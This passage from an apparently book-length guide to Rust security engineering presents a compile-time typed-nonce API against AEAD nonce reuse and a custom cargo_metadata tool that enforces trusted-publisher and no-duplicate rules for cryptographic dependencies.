impl NonceSafeAead for aes_siv::Aes256SivAead {}</code></pre>
<p><code>Aead</code><sup class="footnote-reference" id="fr-TraitAead-1"><a href="#footnote-TraitAead">9</a></sup> is a widely-used trait in the Rust cryptography ecosystem.
It defines a common interface to the <code>encrypt</code> and <code>decrypt</code> operations of Authenticated Encryption with Associated Data (AEAD) algorithms like AES-256-GCM and XChaCha20Poly1305.
This class of algorithms provides both confidentiality and integrity, plus optionally allows binding unencrypted, "associated" metadata (think network headers, UUIDs, or contextual info).
Basically, an AEAD should be your preferred all-in-one solution for most day-to-day encryption problems.</p>
<p>Now the <code>Aead</code> enc/decrypt APIs<sup class="footnote-reference" id="fr-APIAead-1"><a href="#footnote-APIAead">10</a></sup> both take a single nonce type by reference: <code>&amp;Nonce&lt;A: AeadCore&gt;</code>. So a programmer is free to encrypt new data with the same nonce they used for decryption earlier (see Figure 1 above).</p>
<ul>
<li>Notice how a nonce is generic over the <code>AeadCore</code> trait, allowing <em>compile-time</em> verification of algorithm-specific array sizes - e.g. <code>[u8; 12]</code> (96-bit) for AES-256-GCM, <code>[u8; 24]</code> (192-bit) for XChaCha20Poly1305 - at <em>all</em> call-sites.</li>
</ul>
<p>The crux of our above reuse solution is this: we use two distinct nonce types, <code>EncryptionNonce&lt;A: AeadCore&gt;</code> for <code>encrypt</code> and <code>DecryptionNonce&lt;A: AeadCore&gt;</code> for <code>decrypt</code>.
This bifurcation prevents nonce-reuse vulnerabilities, again at <em>compile-time</em> (before shipping and systematically across the entire codebase), because:</p>
<ul>
<li>
<p><code>EncryptionNonce</code> is guaranteed to be <em>randomly-generated</em> (opaque type with rand-only constructor) and <em>single-use</em> (pass-by-value parameter semantics). The single-use property is especially amenable to Rust's [linear] type system. Its decryption counterpart, alias <code>type DecryptionNonce&lt;A&gt; = Nonce&lt;A&gt;;</code>, continues to work normally.</p>
</li>
<li>
<p>Marker trait <code>CryptoRng</code><sup class="footnote-reference" id="fr-TraitCryptoRng-1"><a href="#footnote-TraitCryptoRng">11</a></sup> in <code>fn generate_nonce(rng: impl CryptoRng + RngCore)</code> is critical. A <em>biased</em> (meaning not uniformly random) nonce can be as disastrous as a reused nonce. In another ECDSA debacle, biased nonces allowed extraction of Bitcoin private keys<sup class="footnote-reference" id="fr-BitFail-1"><a href="#footnote-BitFail">12</a></sup>.</p>
</li>
</ul>
<blockquote>
<p><em><strong>What about "nonce misuse-resistant" algorithms? And size limitations?</strong></em></p>
<p>Strong typing isn't the only possible solution for nonce-reuse.
Defenses can also be implemented in the design of the algorithm itself, see AES-GCM-SIV<sup class="footnote-reference" id="fr-AesSIVRFC-1"><a href="#footnote-AesSIVRFC">13</a></sup>.
A "Synthetic Initialization Vector" (SIV) uses inputs, including plaintext, to derive the final IV/nonce - effectively forcing two different plaintexts to use two different nonces.</p>
<p>However: if the <em>same message</em> is encrypted with the <em>same nonce</em> <span style="text-decoration: underline;">twice</span> under the <em>same key</em>, an attacker will learn that the two messages are equivalent (but not their contents).
That equivalence leak could have serious implications in context of a larger threat model, so preventing reuse with strong typing is still the higher assurance option.</p>
<p>But we're not out of the woods yet.
AES-256-GCM can only safely encrypt 2<sup>32</sup> (~4.3 billion) messages<sup class="footnote-reference" id="fr-AdamAEAD-1"><a href="#footnote-AdamAEAD">14</a></sup> under the same key using random nonces - beyond that we risk <em>nonce collision</em> (chance reuse). XChaCha20Poly1305 bumps that safe limit to 2<sup>80</sup> (practically infinite!)<sup class="footnote-reference" id="fr-XChaCha-1"><a href="#footnote-XChaCha">15</a></sup> and is faster on devices without hardware support for AES.</p>
</blockquote>
<p>We can verify that the <code>NonceSafeAead</code> trait enc/decrypts as expected with the below unit test:</p>
<pre><code class="language-rust ignore">use aead::{KeyInit, OsRng};
use nonce_typing::{EncryptionNonce, NonceSafeAead};

const PLAINTEXT_MSG: &amp;[u8; 86] = b"Two cryptographers walk into a bar. \
    Nobody else has a clue what they're talking about.";

#[test]
fn nonce_safe_xchacha20poly1305() {
    use chacha20poly1305::XChaCha20Poly1305;

    let key = XChaCha20Poly1305::generate_key(&amp;mut OsRng);
    let cipher = XChaCha20Poly1305::new(&amp;key);
    let enc_nonce = EncryptionNonce::&lt;XChaCha20Poly1305&gt;::generate_nonce(&amp;mut OsRng);

    let (ciphertext, dec_nonce) = cipher
        .nonce_safe_encrypt(enc_nonce, PLAINTEXT_MSG.as_ref())
        .unwrap();

    let plaintext = cipher.decrypt(&amp;dec_nonce, ciphertext.as_ref()).unwrap();

    assert_eq!(&amp;plaintext, PLAINTEXT_MSG);
}</code></pre>
<p>But does it actually prevent reuse?
You're welcome to try passing the same <code>enc_nonce</code> to two different <code>nonce_safe_encrypt</code> calls - the compiler error should look familiar!</p>
<blockquote>
<p><em><strong>Where do I start with "formally verified" cryptography?</strong></em></p>
<p>Proving that a program satisfies a specific property, for any input, is the goal of <em>formal verification</em>.
Rust's type system, which guarantees that data is "shared XOR mutable", is particularly amenable to certain formal techniques - less reasoning about the state of memory is needed.
Cryptography is also lower-cost to verify: detailed specifications exist, data structures are statically-allocated, and input size is bounded.</p>
<p>Verification techniques vary widely (theorem proving, model checking, abstract interpretation, symbolic execution, etc) and the corresponding tools typically require significant expertise to leverage.
But as <del>lazy</del> busy developers, we can readily integrate and benefit from already-formally-verified libraries.
Two contenders for native cryptography are:</p>
<ol>
<li><code>aws-lc-rs</code> (Amazon)<sup class="footnote-reference" id="fr-AWSLC-1"><a href="#footnote-AWSLC">16</a></sup> - Symbolic execution of source code is used to prove that a program matches a machine-readable specification manually encoded from an algorithm's human-readable specification.
<br><br/></li>
<li><code>symcrypt</code> (Microsoft)<sup class="footnote-reference" id="fr-SymCrypt-1"><a href="#footnote-SymCrypt">17</a></sup> - Source is translated to a model for an interactive (meaning semi-manual) theorem prover. Additionally, a combination of fuzzing and model-based testing is used to detect timing side-channels.</li>
</ol>
<p>Keep in mind that formal verification is not a panacea: specifications can be incomplete and implementations can deviate from models.
The aforementioned WPA2 4-way handshake was formally verified yet still exploitable!
Its proof failed to specify when a negotiated key should be installed, implicitly allowing multiple installations and thus nonce reset on next install <sup class="footnote-reference" id="fr-KRACK-2"><a href="#footnote-KRACK">7</a></sup>.</p>
</blockquote>
<h2 id="supply-chain-allowlist-crypto-publishers-and-ban-duplicates"><a class="header" href="#supply-chain-allowlist-crypto-publishers-and-ban-duplicates">Supply-chain: Allowlist Crypto Publishers and Ban Duplicates</a></h2>
<p>Programming languages with official package registries are a joy to use: easily finding and integrating 3rd-party libraries means faster delivery speed and greater focus on your problem/business domain.
But all convenience has a cost.
Here:</p>
<ul>
<li>
<p><strong>Increased attack surface</strong> - Just one malicious crate, no matter how deep in a massive dependency graph, can compromise the entire <em>application</em>. And typo-squatting attacks indiscriminately victimize a percentage of the entire <em>ecosystem</em>.</p>
</li>
<li>
<p><strong>Statistical weakening of memory-safety</strong> - Dependency count likely has some correlation to amount of <code>unsafe</code> Rust code ([19% of public crates use <code>unsafe</code><sup class="footnote-reference" id="fr-UnsafeState-1"><a href="#footnote-UnsafeState">18</a></sup>) and other-language CFFI code, and thus amount of total <em>unsound</em> code (realistically some subset of <code>unsafe</code>). Any unsound code can trigger memory safety errors at runtime, which often go undetected in production.</p>
</li>
<li>
<p><strong>Software bloat</strong> - Transitive dependencies tend to sprawl in number<sup class="footnote-reference" id="fr-Bloat-1"><a href="#footnote-Bloat">19</a></sup>, causing "simple" apps to explode in objective size and complexity. Larger programs generally mean slower app startup and longer download times. Plus both routine (e.g. API upgrade) and emergency (e.g. vulnerable dependency alert) maintenance burden.</p>
</li>
</ul>
<p>Supply-chain assurance is particularly important for cryptographic dependencies, which likely have an out-sized impact on the security properties of an overall system. Application logic higher up the stack tends to rely on crypto libraries, implicitly or explicitly.</p>
<p>Imagine you've been handed a strict mandate: the two requirements below <em>must</em> hold for your <em>entire</em> million-plus line monorepo.</p>
<ol>
<li>
<p><strong>Trusted Publishers</strong> - All direct (e.g. non-transitive) cryptographic dependencies must be sourced from a small allowlist of trusted publishers, initially only the <code>RustCrypto</code> organization<sup class="footnote-reference" id="fr-RustCrypto-1"><a href="#footnote-RustCrypto">20</a></sup>.</p>
<ul>
<li>
<p><em><strong>Rationale:</strong> Minimize both <code>RUSTSEC</code><sup class="footnote-reference" id="fr-RustSecDB-1"><a href="#footnote-RustSecDB">21</a></sup> alert volume and backdoor introduction risk.</em></p>
</li>
<li>
<p><em><strong>Scope:</strong> Direct dependencies only. Publishers we explicitly trust can still select their own dependencies.</em></p>
</li>
</ul>
</li>
<li>
<p><strong>No Duplicates</strong> - All direct and indirect cryptographic dependencies must have exactly one version in-tree at any time.</p>
<ul>
<li>
<p><em><strong>Rationale:</strong> Minimize both bloat and programmer error (e.g. unclear behavior divergence between API versions).</em></p>
</li>
<li>
<p><em><strong>Scope:</strong> All dependencies. Duplicate bloat is likely avoidable - some crate owner should consider updating to latest.</em></p>
</li>
</ul>
</li>
</ol>
<br>
<body>
  <div class="diagram-row">
    <div class="diagram-col2">
      <img src="chp14/tt_supplychain_1.svg" alt="Before supply-chain policy enforcement">
      <br>
      <figcaption><i><center><b>Fig. 2:</b> No supply-chain policy. Tolerate organic dependency sprawl.</center></i></figcaption>
    </div>
    <div class="diagram-col">
      <img src="chp14/tt_supplychain_2.svg" alt="After supply-chain policy enforcement">
      <br>
      <figcaption><i><center><b>Fig. 3:</b> Policy enforced: only trusted publisher, no duplicates. Leaner app overall.</center></i></figcaption>
    </div>
  </div>
</body>
<p>How do you enforce this policy (which nicely compliments our previous <code>NonceSafeAead</code> APIs)?
Unfortunately these specific requirements can't be encoded with <code>cargo deny</code><sup class="footnote-reference" id="fr-Cargodeny-1"><a href="#footnote-Cargodeny">22</a></sup>, a popular and mature dependency graph linter, at the time of this writing (v0.18).
We need to roll some custom kit atop <code>cargo_metadata</code><sup class="footnote-reference" id="fr-Cargometadata-1"><a href="#footnote-Cargometadata">23</a></sup>!</p>
<p>Let's start with builder-pattern<sup class="footnote-reference" id="fr-BuilderPattern-1"><a href="#footnote-BuilderPattern">24</a></sup> boilerplate (our public API):</p>
<pre><code class="language-rust ignore">use cargo_metadata::{CargoOpt, Metadata, MetadataCommand, Package, semver::Version};
use std::{
    cell::OnceCell,
    collections::{BTreeMap, BTreeSet, HashMap},
    fs,
    path::{Path, PathBuf},
};

/// A [`Policy`] violation.
/// Note: error variants do expose/re-export error enums from 3rd-party crates.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
#[allow(missing_docs)]
pub enum PolicyViolationError {
    DuplicateCrateVersions(Vec&lt;String&gt;),
    DisallowedCategoryPublisher(String, String),
    MetadataReadError(String),
}

/// A builder for supply-chain policies.
#[derive(Default)]
pub struct Policy {
    // Path to `Cargo.toml` we're analyzing
    manifest_path: PathBuf,
    // Workaround for `OnceCell::get_or_try_init` being nightly-only in Rust 1.88
    cargo_metadata_result: OnceCell&lt;Result&lt;Metadata, PolicyViolationError&gt;&gt;,
    // {category}
    // `String`s lower-cased at construction time
    no_dup_cats: Option&lt;BTreeSet&lt;String&gt;&gt;,
    // category: {publisher}
    // `String`s lower-cased at construction time
    cat_pubs: Option&lt;BTreeMap&lt;String, BTreeSet&lt;String&gt;&gt;&gt;,
}

impl Policy {
    /// Create a new policy, construct with path to workspace or crate-specific `Cargo.toml`.
    pub fn new&lt;P&gt;(manifest_path: P) -&gt; Result&lt;Policy, std::io::Error&gt;
    where
        P: AsRef&lt;Path&gt;,
    {
        let manifest_path = fs::canonicalize(manifest_path)?;
        Ok(Self {
            manifest_path,
            ..Default::default()
        })
    }

    /// Rule 1 (Category-specific Trusted Publishers):
    /// Ensure that a given category only contains crates from a fixed set of trusted publishers.
    /// Assumes input iterator format `(category_1, publisher_1)...(category_n, publisher_n)`.
    /// More then one publisher per category is supported.
    pub fn allowed_category_publishers&lt;I, S&gt;(mut self, cat_pubs: I) -&gt; Policy
    where
        I: Iterator&lt;Item = (S, S)&gt;,
        S: Into&lt;String&gt;,
    {
        let mut cat_pubs = cat_pubs.peekable();
        if cat_pubs.peek().is_some() {
            let mut cat_map = BTreeMap::new();
            for (c, p) in cat_pubs {
                cat_map
                    .entry(c.into().to_ascii_lowercase())
                    .or_insert(BTreeSet::new())
                    .insert(p.into().to_ascii_lowercase());
            }
            self.cat_pubs = Some(cat_map);
        } else {
            self.cat_pubs = None;
        }

        self
    }

    /// ...OMITTED: Rule 2 (Category-specific No Duplicates)...

    /// Evaluate a built policy against a given workspace/crate.
    pub fn run(&amp;self) -&gt; Result&lt;(), PolicyViolationError&gt; {
        self.run_allowed_category_publishers()?;
        self.run_no_duplicate_crate_categories()?;
        Ok(())
    }</code></pre>
<p>To keep the length of this section in check, we'll omit implementation of scaffolding for the 2nd policy requirement (no duplicate cryptographic dependencies).
But the logic is mechanically similar to the first requirement and the complete, runnable ≈300 lines of source for both rules is at <code>code_snippets/chp14/tactical_trust/supplychain_policy</code>.</p>
<p>Notice that the above builder doesn't encode anything specific to <em>cryptographic</em> crates - this interface supports arbitrary categories and publishers.
Before we see what usage looks like in practice, lets dig into enforcement logic for whatever trusted publishers the user specified when initializing <code>cat_pubs</code> with a call to <code>allowed_category_publishers</code> (the below are private APIs):</p>
<pre><code class="language-rust ignore">    /// Collect dependency metadata for the entire workspace with all features enabled.
    fn metadata(&amp;self) -&gt; Result&lt;&amp;Metadata, PolicyViolationError&gt; {
        let meta_result = self.cargo_metadata_result.get_or_init(|| {
            MetadataCommand::new()
                .manifest_path(&amp;self.manifest_path)
                .features(CargoOpt::AllFeatures)
                .exec()
                .map_err(|e| PolicyViolationError::MetadataReadError(e.to_string()))
        });

        meta_result.as_ref().map_err(|e| e.to_owned())
    }

    /// Get repo's publisher by parsing its URL.
    // SECURITY: `dep.authors` isn't reliable - anyone can set any value in their crate's `Cargo.toml`.
    fn get_repo_publisher(dep: &amp;Package) -&gt; Result&lt;String, PolicyViolationError&gt; {
        let Some(repo_url) = dep
            .repository
            .as_ref()
            .and_then(|url| url::Url::parse(url).ok())
        else {
            return Err(PolicyViolationError::MetadataReadError(format!(
                "Missing or invalid repo URL for crate '{}'",
                dep.name
            )));
        };

        // If `repo_url` == "https://github.com/RustCrypto/AEADs/tree/master/aes-gcm"
        // Then `repo_publisher` == "RustCrypto"
        let Some(repo_publisher) = repo_url.path_segments().and_then(|mut path| path.next()) else {
            return Err(PolicyViolationError::MetadataReadError(format!(
                "Missing publisher name for repo URL '{repo_url}'"
            )));
        };

        Ok(repo_publisher.to_string())
    }

    /// Run category-specific trusted publishers check.
    fn run_allowed_category_publishers(&amp;self) -&gt; Result&lt;(), PolicyViolationError&gt; {
        let Some(ref cat_pubs) = self.cat_pubs else {
            return Ok(());
        };

        let metadata = self.metadata()?;

        // ID direct dependencies
        let direct_deps = metadata
            .packages
            .iter()
            .filter(|pkg| pkg.manifest_path.as_path() == self.manifest_path)
            .map(|pkg| &amp;pkg.dependencies)
            .flatten()
            .collect::&lt;Vec&lt;_&gt;&gt;();

        // Get full crate info for each ID-ed direct dependency
        let direct_dep_crates = metadata
            .packages
            .iter()
            .filter(|pkg| direct_deps.iter().any(|dep| dep.name == *pkg.name));

        // Find disallowed category-specific publishers, if any
        for dep_crate in direct_dep_crates {
            for cat in &amp;dep_crate.categories {
                if let Some(expected_pubs) = cat_pubs.get(&amp;cat.to_ascii_lowercase()) {
                    let actual_publisher = Self::get_repo_publisher(dep_crate)?.to_lowercase();
                    if !expected_pubs.contains(&amp;actual_publisher) {
                        return Err(PolicyViolationError::DisallowedCategoryPublisher(
                            cat.clone(),
                            actual_publisher,
                        ));
                    }
                }
            }
        }

        Ok(())
    }</code></pre>
<ul>
<li>
<p><code>fn metadata</code> does memoized collection of dependency metadata for the entire workspace, with all features enabled. Even if the user specifies 10 requirements for 10 different crate categories, we'll run collection exactly once (recall <code>Policy</code> field <code>cargo_metadata_result</code> is a <code>OnceCell</code><sup class="footnote-reference" id="fr-OnceCell-1"><a href="#footnote-OnceCell">25</a></sup>).</p>
</li>
<li>
<p><code>fn get_repo_publisher</code> parses the owner of a repository from its URL. While this logic will extract the publishing <em>user</em> or <em>organization</em> for both GitHub and GitLab URLs, be warned: we're not claiming any of the code in this supply-chain half of this section is robust enough for production usage!</p>
<ul>
<li>We can't rely on the authors field<sup class="footnote-reference" id="fr-CargometadataAuthors-1"><a href="#footnote-CargometadataAuthors">26</a></sup> of <code>cargo_metdata</code>'s <code>Package</code> struct, which could be maliciously set to impersonate a publisher. We instead use [presumably valid] URLs as a source of truth for publisher identification. PKI will be a superior long-term solution, more on this later.</li>
</ul>
</li>
<li>
<p><code>fn run_allowed_category_publishers</code> is the bulk of our trusted publishers (requirement 1) logic. We identify direct dependencies of the target project (to which <code>Policy::new</code> takes a <code>Cargo.toml</code> path) and iterate that list to look for any crate which belongs to a user-specified category but isn't sourced from a user-allowed publisher for that category.</p>
<ul>
<li>Crate category labels are optional, but we could extend the builder to support "allowed publisher for any or missing category" - ensuring unexpected publishers don't slip in. Our policy evaluation logic also doesn't validate user-input category names, a typo will cause checks to pass! Adding validation would be straightforward since categories are fixed<sup class="footnote-reference" id="fr-CrateCats-1"><a href="#footnote-CrateCats">27</a></sup>.</li>
</ul>
</li>
</ul>
<p>So how do we roll out enforcement of our sophisticated policy requirements (category-specific trusted publishers and duplicate elimination)?
The heavy-handed option is leveraging <code>build.rs</code> (Rust build scripts<sup class="footnote-reference" id="fr-RustBuildScripts-1"><a href="#footnote-RustBuildScripts">28</a></sup>):</p>
<pre><code class="language-rust ignore">use supplychain_policy::Policy;

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=Cargo.toml");

    let manifest_dir = std::env::var("CARGO_MANIFEST_DIR").expect("CARGO_MANIFEST_DIR var not set");
    let manifest_path = std::path::PathBuf::from(manifest_dir).join("Cargo.toml");

    Policy::new(&amp;manifest_path)
        .expect("Invalid manifest path")
        .allowed_category_publishers([("cryptography", "rustcrypto")].into_iter())
        .no_duplicate_crate_categories(["cryptography"].into_iter())
        .run()
        .unwrap()
}</code></pre>
<p>Now failing builds for supply-chain policy violations probably isn't the best way to make friends with other development teams, even in a smaller organization, unless there's a strong regulatory and/or business need to do so.
Fortunately the above <code>Policy</code> builder can easily be wrapped in a CLI tool and deployed in <em>blocking</em> or <em>non-blocking</em> CI pipelines, on a workspace-specific basis.
Non-blocking failures can be centrally tracked and automatically triaged.</p>
<p>Our above proof-of-concept didn't accommodate exceptions (e.g. "allow this specific named duplicate, still enforce for remainder of category"), but you could quickly extend it to read individual crate/publisher names from a [version controlled and <code>CODEOWNERS</code> protected] config file.
Supporting legitimate exceptions, with documented rationale, is realistic - "perfect is the enemy of good".</p>
<blockquote>
<p><em><strong>What are my other options for supply-chain security in Rust?</strong></em></p>
<p>The landscape of Rust's supply-chain security tooling is, fortunately, evolving.
Sample projects to be aware of:</p>
<ul>
<li><strong>Signature-based vulnerability alerting:</strong> <code>cargo audit</code><sup class="footnote-reference" id="fr-CargoAudit-1"><a href="#footnote-CargoAudit">29</a></sup>, a free tool to scan your dependency tree for known-vulnerable<sup class="footnote-reference" id="fr-RustSecDB-2"><a href="#footnote-RustSecDB">21</a></sup> crates, is a must-have for production CI. Although a lack of "reachability analysis" (call-graph traversal to determine if your code directly or indirectly calls a vulnerable function) does mean false positives.
<br><br/></li>
<li><strong>Heuristic-based malware detection:</strong> The Linux Foundation has funded development<sup class="footnote-reference" id="fr-CapslockNews-1"><a href="#footnote-CapslockNews">30</a></sup> of a Rust counterpart to Go's <code>capslock</code><sup class="footnote-reference" id="fr-Capslock-1"><a href="#footnote-Capslock">31</a></sup> tool. Among other usecases, <code>capslock</code> enumerates <em>capabilities</em><sup class="footnote-reference" id="fr-CapslockCaps-1"><a href="#footnote-CapslockCaps">32</a></sup> (file I/O, network connectivity, command execution, etc) for a given dependency and alerts if they suddenly change in a new version.
<br><br/></li>
<li><strong>Trusted publishers:</strong> Future PKI initiatives<sup class="footnote-reference" id="fr-RustPKI-1"><a href="#footnote-RustPKI">33</a></sup> may allow cryptographic identification of publishers, a big improvement over our above URL parsing. A related RFC<sup class="footnote-reference" id="fr-RustTrustedPubs-1"><a href="#footnote-RustTrustedPubs">34</a></sup> outlines support for publishing crates from trusted infrastructure, following the footsteps of PyPI<sup class="footnote-reference" id="fr-PyTrustedPubs-1"><a href="#footnote-PyTrustedPubs">35</a></sup>. Note PKI also means better response capability, although a real-world attack may have already succeeded by the time a build machine pulls a Certificate Revocation List (CRL).</li>
</ul>
<p>While Rust's intentionally minimal <code>std</code> library is boon for embedded development, it does encourage over-reliance on 3rd-party crates for routine tasks.
For contrast: Go's standard library offers FIPS 140-3 compliant cryptography<sup class="footnote-reference" id="fr-GoFIPS-1"><a href="#footnote-GoFIPS">36</a></sup> with the flip of a build flag and backported a secure RNG<sup class="footnote-reference" id="fr-GoCSPRNG-1"><a href="#footnote-GoCSPRNG">37</a></sup> to existing programs with only a Go toolchain bump!</p>
</blockquote>
<h2 id="takeaway-20"><a class="header" href="#takeaway-20">Takeaway</a></h2>
<p>"Trust is earned in drops and lost in buckets".
That's probably a maxim, but it feels especially true in the context of commercial software - a global competition in which any winner, perhaps outside of a few monopolists, can be dethroned at any time.</p>
<p>Now the technical mechanism for trust is cryptography.
Most useful cryptography is implemented and executing, whether on a tiny microcontroller or a beefy server, in the form of code.
And code is notoriously difficult to get right, especially when you're shipping a lot of it.</p>
<p>Software quality is as challenging to replicate reliably as it is to measure actionably, if not more so.
Our best hope is automating repeatability.
When the quality criteria is security, automation is one goal of a platform security engineering function.
Which needs to keep pace with the broader engineering organization at minimum, and ideally should accelerate all feature teams.</p>
<p>This first section explored bite-sized solutions to platform cryptography problems at the API (nonce reuse) and supply-chain (dependency policy) levels.
The intent is automating guardrails for <em>human</em> error, but nowadays <em>LLM</em> auto-complete increases vulnerability rate<sup class="footnote-reference" id="fr-LLM1-1"><a href="#footnote-LLM1">38</a></sup> <sup class="footnote-reference" id="fr-LLM2-1"><a href="#footnote-LLM2">39</a></sup>.
The good news is that the above techniques should mitigate risks from both sources.
Compile-time checks don't care how the code was generated.</p>
<p>Our second and final section will have a narrower but deeper scope.
We'll explore a classic topic in trust: <em>information disclosure</em> vulnerabilities.
Part 2 grapples with technical concepts at greater length and on the cutting edge.
You're going to want a coffee for this one.</p>
<p>But it'll still be good fun.
Trust me.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-MatterHeartbleed">
<p><a href="https://dl.acm.org/doi/pdf/10.1145/2663716.2663755"><em>The Matter of Heartbleed</em></a>. Zakir Durumeric, Frank Li, James Kasten, Nicolas Weaver, Johanna Amann, Jethro Beekman, Mathias Payer, David Adrian, Michael Bailey, Vern Paxson, J. Alex Halderman (2014). <a href="#fr-MatterHeartbleed-1">↩</a></p>
</li>
<li id="footnote-Ivory">
<p><a href="https://en.wikipedia.org/wiki/Ivory_tower"><em>Ivory Tower</em></a>. Wikipedia (Accessed 2025). <a href="#fr-Ivory-1">↩</a></p>
</li>
<li id="footnote-GoodNews">
<p><a href="https://futurama.fandom.com/wiki/Good_news,_everyone!"><em>Good new, everyone!</em></a>. Futurama Wiki (Accessed 2025). <a href="#fr-GoodNews-1">↩</a></p>
</li>
<li id="footnote-RWCBook">
<p><a href="https://amzn.to/43ov045"><em><strong>[PERSONAL FAVORITE]</strong> Real-world Cryptography</em> by Dave Wong</a>. David Wong (2021). <a href="#fr-RWCBook-1">↩</a></p>
</li>
<li id="footnote-SoatokBlog">
<p><a href="https://soatok.blog/category/cryptography/"><em>Soatok's Cryptography Blog</em></a>. Soatok (Accessed 2025). <a href="#fr-SoatokBlog-1">↩</a></p>
</li>
<li id="footnote-RWCConf">
<p><a href="https://rwc.iacr.org/"><em>Real World Crypto Symposium</em></a>. IACR (Accessed 2025). <a href="#fr-RWCConf-1">↩</a></p>
</li>
<li id="footnote-KRACK">
<p><a href="https://dl.acm.org/doi/pdf/10.1145/2663716.2663755"><em>Key Reinstallation Attacks: Forcing Nonce Reuse in WPA2</em></a>. Mathy Vanhoef, Frank Piessens (2017). <a href="#fr-KRACK-1">↩</a> <a href="#fr-KRACK-2">↩2</a></p>
</li>
<li id="footnote-PS3Signing">
<p><a href="https://www.youtube.com/watch?v=DUGGJpn2_zY"><em>PS3 Epic Fail</em></a>. FailOverflow (2010). <a href="#fr-PS3Signing-1">↩</a></p>
</li>
<li id="footnote-TraitAead">
<p><a href="https://docs.rs/aead/0.5.2/aead/trait.Aead.html"><em>Trait <code>aead::Aead</code></em></a>. RustCrypto organization (Accessed 2025). <a href="#fr-TraitAead-1">↩</a></p>
</li>
<li id="footnote-APIAead">
<p><a href="https://docs.rs/aead/0.5.2/aead/trait.Aead.html#tymethod.encrypt"><em>API <code>aead::Aead::encrypt</code></em></a>. RustCrypto organization (Accessed 2025). <a href="#fr-APIAead-1">↩</a></p>
</li>
<li id="footnote-TraitCryptoRng">
<p><a href="https://docs.rs/rand_core/0.9.3/rand_core/trait.CryptoRng.html"><em>Trait <code>CryptoRng</code></em></a>. RustCrypto organization (Accessed 2025). <a href="#fr-TraitCryptoRng-1">↩</a></p>
</li>
<li id="footnote-BitFail">
<p><a href="https://eprint.iacr.org/2019/023.pdf"><em>Biased Nonce Sense: Lattice Attacks against Weak ECDSA Signatures in Cryptocurrencies</em></a>. Joachim Breitner, Nadia Heninger (2019). <a href="#fr-BitFail-1">↩</a></p>
</li>
<li id="footnote-AesSIVRFC">
<p><a href="https://datatracker.ietf.org/doc/html/rfc8452"><em>AES-GCM-SIV: Nonce Misuse-Resistant Authenticated Encryption</em></a>. S. Gueron, A. Langley,  Y. Lindell (2019). <a href="#fr-AesSIVRFC-1">↩</a></p>
</li>
<li id="footnote-AdamAEAD">
<p><a href="https://www.imperialviolet.org/2015/05/16/aeads.html"><em>AEADs: getting better at symmetric cryptography</em></a>. Adam Langley (2015). <a href="#fr-AdamAEAD-1">↩</a></p>
</li>
<li id="footnote-XChaCha">
<p><a href="https://datatracker.ietf.org/doc/html/draft-irtf-cfrg-xchacha-03#section-2.1"><em>XChaCha: eXtended-nonce ChaCha and AEAD_XChaCha20_Poly1305</em></a>. S. Arciszewski (2020). <a href="#fr-XChaCha-1">↩</a></p>
</li>
<li id="footnote-AWSLC">
<p><a href="https://crates.io/crates/aws-lc-rs"><em>aws-lc-rs</em></a>. Amazon (Accessed 2025). <a href="#fr-AWSLC-1">↩</a></p>
</li>
<li id="footnote-SymCrypt">
<p><a href="https://crates.io/crates/symcrypt"><em>symcrypt</em></a>. Microsoft (Accessed 2025). <a href="#fr-SymCrypt-1">↩</a></p>
</li>
<li id="footnote-UnsafeState">
<p><a href="https://rustfoundation.org/media/unsafe-rust-in-the-wild-notes-on-the-current-state-of-unsafe-rust/"><em>Unsafe Rust in the Wild: Notes on the Current State of Unsafe Rust</em></a>. Rust Foundation (2024). <a href="#fr-UnsafeState-1">↩</a></p>
</li>
<li id="footnote-Bloat">
<p><a href="https://spectrum.ieee.org/lean-software-development"><em>Why Bloat Is Still Software's Biggest Vulnerability: A 2024 plea for lean software</em></a>. Bert Hubert (2024). <a href="#fr-Bloat-1">↩</a></p>
</li>
<li id="footnote-RustCrypto">
<p><a href="https://github.com/rustcrypto"><em>RustCryto</em></a>. RustCrypto organization (Accessed 2025). <a href="#fr-RustCrypto-1">↩</a></p>
</li>
<li id="footnote-RustSecDB">
<p><a href="https://rustsec.org/advisories/"><em>The Rust Security Advisory Database</em></a>. Rust Secure Code Working Group (Accessed 2025). <a href="#fr-RustSecDB-1">↩</a> <a href="#fr-RustSecDB-2">↩2</a></p>
</li>
<li id="footnote-Cargodeny">
<p><a href="https://crates.io/crates/cargo-deny"><em><code>cargo_deny</code></em></a>. Embark Studios (Accessed 2025). <a href="#fr-Cargodeny-1">↩</a></p>
</li>
<li id="footnote-Cargometadata">
<p><a href="https://crates.io/crates/cargo_metadata"><em><code>cargo_metadata</code></em></a>. Oliver Schneider (Accessed 2025). <a href="#fr-Cargometadata-1">↩</a></p>
</li>
<li id="footnote-BuilderPattern">
<p><a href="https://rust-unofficial.github.io/patterns/patterns/creational/builder.html"><em>Rust Design Patterns: Builder</em></a>. Rust Unofficial (Accessed 2025). <a href="#fr-BuilderPattern-1">↩</a></p>
</li>
<li id="footnote-OnceCell">
<p><a href="https://doc.rust-lang.org/beta/std/cell/struct.OnceCell.html"><em><code>OnceCell</code></em></a>. The Rust Project (Accessed 2025). <a href="#fr-OnceCell-1">↩</a></p>
</li>
<li id="footnote-CargometadataAuthors">
<p><a href="https://docs.rs/cargo_metadata/0.20.0/cargo_metadata/struct.Package.html#structfield.authors"><em><code>cargo_metadata::Package</code></em></a>. Oliver Schneider (Accessed 2025). <a href="#fr-CargometadataAuthors-1">↩</a></p>
</li>
<li id="footnote-CrateCats">
<p><a href="https://crates.io/categories"><em>Categories</em></a>. crates.io (Accessed 2025). <a href="#fr-CrateCats-1">↩</a></p>
</li>
<li id="footnote-RustBuildScripts">
<p><a href="https://doc.rust-lang.org/cargo/reference/build-script-examples.html"><em>Rust Build Scripts</em></a>. The Cargo Team (Accessed 2025). <a href="#fr-RustBuildScripts-1">↩</a></p>
</li>
<li id="footnote-CargoAudit">
<p><a href="https://crates.io/crates/cargo-audit"><em><code>cargo_audit</code></em></a>. Alex Gaynor, Tony Arcieri, Sergey Davidoff (Accessed 2025). <a href="#fr-CargoAudit-1">↩</a></p>
</li>
<li id="footnote-CapslockNews">
<p><a href="https://alpha-omega.dev/blog/crustabilities-capabilities-rust-and-capslock/"><em>CRustabilities: Capabilities, Rust and Capslock</em></a>. Alpha-Omega (Accessed 2025). <a href="#fr-CapslockNews-1">↩</a></p>
</li>
<li id="footnote-Capslock">
